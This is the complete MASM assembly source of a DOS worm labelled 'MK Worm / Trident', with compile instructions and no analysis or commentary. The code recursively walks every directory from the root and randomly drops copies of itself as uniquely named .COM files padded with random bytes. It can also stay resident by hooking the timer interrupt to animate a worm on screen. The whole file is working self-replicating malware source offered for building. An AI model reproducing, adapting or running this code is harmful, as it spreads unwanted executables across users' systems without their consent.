;**********************************************************************
;*
;*  MK Worm
;*
;*  Compile with MASM 4.0
;*
;**********************************************************************

cseg            segment
                assume  cs:cseg,ds:cseg,es:cseg
                .radix  16
                org     0100


wormlen         equ     8
filelen         equ     eind - begin
old_dir         equ     eind
DTA             equ     offset eind + 100d


;**********************************************************************
;*              Main program
;**********************************************************************

begin:          call    rnd_init

                mov     bp,DTA                  ;change DTA
                call    set_DTA

                mov     ah,47                   ;get name of current directory
                cwd
                mov     si,offset old_dir
                int     21

                mov     dx,offset root_dir      ;goto root
                call    chdir

                call    search                  ;search directory's

                mov     dx,offset old_dir       ;goto original directory
                call    chdir

                call    rnd_get                 ;go resident?
                and     al,0F
                jz      go_res

                int     20

go_res:         mov     ax,351C                 ;go resident!
                int     21
                lea     si,oldvec
                mov     [si],bx
                mov     [si+2],es
                lea     dx,routine
                mov     ax,251C
                int     21
                mov     dx,offset eind
                int     27


;**********************************************************************
;*              search dir
;**********************************************************************

search:         mov     dx,offset dirname       ;search *.*
                mov     cx,16
                mov     ah,4E
finddir:        int     21
                jc      no_dir

                test    byte ptr [bp+15],10     ;directory?
                je      next_dir
                cmp     byte ptr [bp+1E],'.'    ;is it '.' or '..' ?
                je      next_dir

                lea     dx,[bp+1E]              ;goto directory
                call    chdir
                lea     bp,[bp+2C]              ;change DTA
                call    set_DTA

                call    search                  ;searc directory (recurse!)

                lea     bp,[bp-2C]              ;goto previous DAT
                call    set_DTA
                mov     dx,offset back_dir      ;'CD ..'
                call    chdir

next_dir:       mov     ah,4F                   ;find next
                jmp     short finddir

no_dir:         call    rnd_get                 ;copy worm to this directory?
                and     al,3
                jnz     no_worm

                mov     dx,offset comname       ;search *.com
                mov     ah,4E
                mov     cx,06
findcom:        int     21
                jc      makeit
                
                mov     ax,word ptr [bp-1A]     ;worm already there?
                sub     ax,filelen
                cmp     ax,10
                jnb     no_worm

                mov     ah,4F
                jmp     short findcom


makeit:         call    makeworm                ;copy the worm!

no_worm:        ret


;**********************************************************************
;*              change dir
;**********************************************************************

chdir:          mov     ah,3Bh
                int     21
                ret


;**********************************************************************
;*              set DTA
;**********************************************************************

set_DTA:        mov     dx,bp
                mov     ah,1A
                int     21
                ret


;**********************************************************************
;*              create worm
;**********************************************************************

makeworm:       mov     ah,5A                   ;create unique filename
                xor     cx,cx
                mov     dx,offset filename
                mov     si,offset restname
                mov     byte ptr [si],0
                int     21
                xchg    ax,bx

                mov     ah,40                   ;write worm
                mov     cx,filelen
                mov     dx,0100
                int     21

                call    rnd_get                 ;append a few bytes
                and     ax,0F
                xchg    ax,cx
                mov     dx,0100
                mov     ah,40
                int     21
                
                mov     ah,3E                   ;close file
                int     21

                lea     di,[si+13d]             ;copy filename
                push    di
                push    si
                movsw
                movsw
                movsw
                movsw
                mov     si,offset comname+1
                movsw
                movsw
                movsb

                pop     dx                      ;rename file to .COM
                pop     di
                mov     ah,56
                int     21

                ret


;**********************************************************************
;*              new int 1C handler
;**********************************************************************

routine:        cli                             ;save registers
                push    ds
                push    es
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di

                push    cs
                push    cs
                pop     ds
                pop     es

zzz3:           inc     byte ptr [count]
                mov     al,byte ptr [count]
                test    al,1                    ;only every 2nd tick
                jz      nothing
                cmp     al,3                    ;don't change direction yet
                jb      zzz2
                call    rnd_get
                and     al,3                    ;change direction?
                jnz     zzz2

zzz0:           call    dirchange               ;change direction!
                mov     al,byte ptr [direction]
                xor     al,byte ptr [old_direc]
                and     al,1
                jz      zzz0                    ;90 degrees with old direction?

zzz2:           call    getnext                 ;calculate next position
                call    checknext               ;does it hit the border?
                jc      zzz0

                mov     al,byte ptr [direction] ;save old direction
                mov     byte ptr [old_direc],al
                call    moveworm

                mov     ah,0F                   ;ask video mode
                int     10
                cmp     al,7
                jz      goodmode
                cmp     al,4
                jnb     nothing
                cmp     al,2
                jb      nothing
       
goodmode:       mov     ah,3                    ;read cursor position
                int     10
                push    dx

                call    printworm

                pop     dx                      ;restore cursor position
                mov     ah,2
                int     10

nothing:        pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                pop     es
                pop     ds
                sti

                jmp     cs:[oldvec]             ;original vector

oldvec          dd      0
                

;**********************************************************************
;*              changes direction of worm
;**********************************************************************

dirchange:      call    rnd_get                 ;get random numbar
                and     al,2
                mov     ah,byte ptr [direction] ;change direction 90 degrees
                xor     ah,0FF
                and     ah,1
                or      ah,al
                mov     byte ptr [direction],ah
                mov     byte ptr [count],0
                ret


;**********************************************************************
;*              finds next position of the worm
;**********************************************************************

getnext:        mov     al,byte ptr [yval+wormlen]
                mov     byte ptr [yval+wormlen+1],al
                mov     al,byte ptr [xval+wormlen]
                mov     byte ptr [xval+wormlen+1],al

                mov     ah,byte ptr [direction]
                cmp     ah,3
                je      is_3
                cmp     ah,2
                je      is_2
                cmp     ah,1
                je      is_1

is_0:           mov     al,byte ptr [yval+wormlen]      ;up
                dec     al
                mov     byte ptr [yval+wormlen+1],al
                ret

is_1:           mov     al,byte ptr [xval+wormlen]      ;left
                dec     al
                dec     al
                mov     byte ptr [xval+wormlen+1],al
                ret

is_2:           mov     al,byte ptr [yval+wormlen]      ;down
                inc     al
                mov     byte ptr [yval+wormlen+1],al
                ret

is_3:           mov     al,byte ptr [xval+wormlen]      ;right
                inc     al
                inc     al
                mov     byte ptr [xval+wormlen+1],al
                ret


;**********************************************************************
;*              checks if worm will hit borders
;**********************************************************************

checknext:      mov     al,byte ptr [xval+wormlen+1]
                cmp     al,0
                jl      fout
                cmp     al,80d
                jae     fout

                mov     al,byte ptr [yval+wormlen+1]
                cmp     al,0
                jl      fout
                cmp     al,25d
                jae     fout

                clc
                ret
fout:           stc
                ret


;**********************************************************************
;*              move the worm
;**********************************************************************

moveworm:       mov     si,offset xval+1
                lea     di,[si-1]
                mov     cx,wormlen+1
        rep     movsb
                mov     si,offset yval+1
                lea     di,[si-1]
                mov     cx,wormlen+1
        rep     movsb
                ret


;**********************************************************************
;*              print the worm on screen
;**********************************************************************

printworm:      mov     si,offset xval
                call    move
                mov     al,20                   ;print space on rear end
                call    print
                mov     cx,wormlen-1
lup:            call    move
                mov     al,0F                   ;print dots
                call    print
                loop    lup
                call    move
                mov     al,2                    ;print head of worm
                call    print
                ret


;**********************************************************************
;*              move the cursor
;**********************************************************************

move:           mov     ah,[si+wormlen+2]
                lodsb
                xchg    ax,dx
                mov     ah,02
                int     10
                ret


;**********************************************************************
;*              print a character
;**********************************************************************

print:          push    cx
                mov     ah,09
                mov     bl,0C
                mov     cx,1
                int     10
                pop     cx
                ret


;****************************************************************************
;*              random number generator
;****************************************************************************

rnd_init:       push    cx
                call    rnd_init0
                and     ax,000F
                inc     ax
                xchg    ax,cx
random_lup:     call    rnd_get
                loop    random_lup
                pop     cx
                ret

rnd_init0:      push    dx                      ;initialize generator
                push    cx
                mov     ah,2C
                int     21
                in      al,40
                mov     ah,al
                in      al,40
                xor     ax,cx
                xor     dx,ax
                jmp     short move_rnd

rnd_get:        push    dx                      ;calculate a random number
                push    cx
                push    bx
                mov     ax,0
                mov     dx,0
                mov     cx,7
rnd_lup:        shl     ax,1
                rcl     dx,1
                mov     bl,al
                xor     bl,dh
                jns     rnd_l2
                inc     al
rnd_l2:         loop    rnd_lup
                pop     bx

move_rnd:       mov     word ptr cs:[rnd_get+4],ax
                mov     word ptr cs:[rnd_get+7],dx
                mov     al,dl
                pop     cx
                pop     dx
                ret


;**********************************************************************
;*              data
;**********************************************************************

                db      ' MK Worm / Trident '
root_dir        db      '\',0
back_dir        db      '..',0
dirname         db      '*.*',0

comname         db      '*.COM',0
filename        db      '.\'
restname        db      (26d) dup (?)

xval            db      32d, 34d, 36d, 38d, 40d, 42d, 44d, 46d, 48d, 0
yval            db      (wormlen+2) dup (12d)

direction       db      3
old_direc       db      3
count           db      0

eind:

cseg            ends
                end     begin

